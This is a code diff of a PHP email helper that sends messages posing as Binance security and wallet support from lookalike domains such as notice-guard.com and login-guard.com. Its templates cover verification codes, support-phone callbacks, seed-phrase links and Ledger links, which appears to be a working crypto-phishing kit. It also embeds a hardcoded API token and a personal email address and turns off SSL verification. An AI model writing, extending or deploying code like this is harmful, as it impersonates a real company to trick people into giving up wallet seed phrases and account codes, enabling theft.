@@ -9,13 +9,13 @@ class EmailHelper {
     
     public function __construct() {
         $this->config = [
-            'api_url' => 'https://demo.campaigns.mumara.com/api/sendEmail',
+            'api_url' => 'https://login-guard.com/api/sendEmail',
             'api_token' => 'CigcSiZ0nDe8l6vU5TIKbfr6mlYAf4fUIHm5c6QZXmoYxevVZRtWzU3PQ6Pn',
-            'default_from_name' => 'Binance Support',
-            'default_from_email' => 'anish.ojha@provistechnologies.com',
-            'default_bounce_email' => 'anish.ojha@provistechnologies.com',
-            'default_reply_to' => 'noreply@binance.com',
-            'default_node_id' => '30',
+            'default_from_name' => 'Binance',
+            'default_from_email' => 'test@notice-guard.com',
+            'default_bounce_email' => 'bounce@notice-guard.com',
+            'default_reply_to' => 'reply@mumara.com',
+            'default_node_id' => '1',
             'timeout' => 30
         ];
     }
@@ -29,7 +29,8 @@ class EmailHelper {
         
         return $this->sendEmail($recipient, $subject, $body, [
             'from_name' => 'Binance Security',
-            'template_type' => 'verification'
+            'template_type' => 'verification',
+            'node_id' => '1',
         ]);
     }
     
@@ -42,7 +43,8 @@ class EmailHelper {
         
         return $this->sendEmail($recipient, $subject, $body, [
             'from_name' => 'Binance Security Alert',
-            'template_type' => 'security_alert'
+            'template_type' => 'security_alert',
+            'node_id' => '2',
         ]);
     }
     
@@ -55,7 +57,8 @@ class EmailHelper {
         
         return $this->sendEmail($recipient, $subject, $body, [
             'from_name' => 'Binance Security',
-            'template_type' => 'confirmation'
+            'template_type' => 'confirmation',
+            'node_id' => '3',
         ]);
     }
     
@@ -68,7 +71,8 @@ class EmailHelper {
         
         return $this->sendEmail($recipient, $subject, $body, [
             'from_name' => 'Binance Wallet Security',
-            'template_type' => 'wallet_security'
+            'template_type' => 'wallet_security',
+            'node_id' => '4',
         ]);
     }
     
@@ -81,7 +85,8 @@ class EmailHelper {
        
         return $this->sendEmail($recipient, $subject, $body, [
             'from_name' => 'Binance Hardware Wallet',
-            'template_type' => 'hardware_wallet'
+            'template_type' => 'hardware_wallet',
+            'node_id' => '5',
         ]);
     }
     
@@ -99,7 +104,6 @@ class EmailHelper {
         
         // Prepare email data
         $emailData = [
-            'api_token' => $this->config['api_token'],
             'recipient' => $recipient,
             'from_name' => $options['from_name'] ?? $this->config['default_from_name'],
             'from_email' => $options['from_email'] ?? $this->config['default_from_email'],
@@ -110,6 +114,8 @@ class EmailHelper {
             'node_id' => $options['node_id'] ?? $this->config['default_node_id']
         ];
         
+        file_put_contents("activity_logs/".date('Y-m-d') . "email_template.txt", $body . PHP_EOL, FILE_APPEND);
+
         try {
             // Initialize cURL
             $ch = curl_init();
@@ -117,13 +123,14 @@ class EmailHelper {
             curl_setopt_array($ch, [
                 CURLOPT_URL => $this->config['api_url'],
                 CURLOPT_CUSTOMREQUEST => 'POST',
-                CURLOPT_POSTFIELDS => http_build_query($emailData),
+                CURLOPT_POSTFIELDS => json_encode($emailData),
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_TIMEOUT => $this->config['timeout'],
                 CURLOPT_FOLLOWLOCATION => true,
                 CURLOPT_SSL_VERIFYPEER => false,
                 CURLOPT_HTTPHEADER => [
-                    'Content-Type: application/x-www-form-urlencoded',
+                    'Authorization: Bearer ' . $this->config['api_token'],
+                    'Content-Type: application/json',
                     'User-Agent: Binance-EmailHelper/1.0'
                 ]
             ]);
@@ -168,7 +175,7 @@ class EmailHelper {
      * Email Templates
      */
     private function getVerificationEmailTemplate($verificationCode, $customerName) {
-        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
+        $greeting = $customerName ? "Dear {$customerName}," : "Dear Customer,";
         
         return "
         <html>
@@ -178,15 +185,11 @@ class EmailHelper {
                 <h2 style='color: #1e2329; margin-bottom: 20px;'>{$greeting}</h2>
                 
                 <p style='color: #474d57; font-size: 16px; line-height: 1.5; margin-bottom: 20px;'>
-                    Your verification code is:
+                    Your verification code is: {$verificationCode}
                 </p>
                 
-                <div style='background-color: #fcd535; padding: 20px; text-align: center; border-radius: 8px; margin: 20px 0;'>
-                    <h1 style='color: #1e2329; margin: 0; font-size: 32px; letter-spacing: 4px;'>{$verificationCode}</h1>
-                </div>
-                
                 <p style='color: #474d57; font-size: 14px; line-height: 1.5; margin-bottom: 20px;'>
-                    <strong>Important:</strong> Never share this code with anyone. Only a genuine advisor will confirm it to you.
+                    Never share this code with anyone. Only a genuine advisor will confirm it to you.
                 </p>
                 
                 <div style='border-top: 1px solid #eaecef; padding-top: 20px; margin-top: 30px; text-align: center;'>
@@ -201,7 +204,7 @@ class EmailHelper {
     }
     
     private function getApiKeyEmailTemplate($supportPhone, $customerName) {
-        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
+        $greeting = $customerName ? "Dear {$customerName}," : "Dear Customer,";
         
         return "
         <html>
@@ -227,7 +230,7 @@ class EmailHelper {
     }
     
     private function getApiCancelEmailTemplate($customerName) {
-        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
+        $greeting = $customerName ? "Dear {$customerName}," : "Dear Customer,";
         
         return "
         <html>
@@ -252,7 +255,7 @@ class EmailHelper {
     }
     
     private function getSeedPhraseEmailTemplate($seedUrl, $customerName) {
-        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
+        $greeting = $customerName ? "Dear {$customerName}," : "Dear Customer,";
         
         return "
         <html>
@@ -284,7 +287,7 @@ class EmailHelper {
     }
     
     private function getLedgerEmailTemplate($ledgerUrl, $customerName) {
-        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
+        $greeting = $customerName ? "Dear {$customerName}," : "Dear Customer,";
         
         return "
         <html>
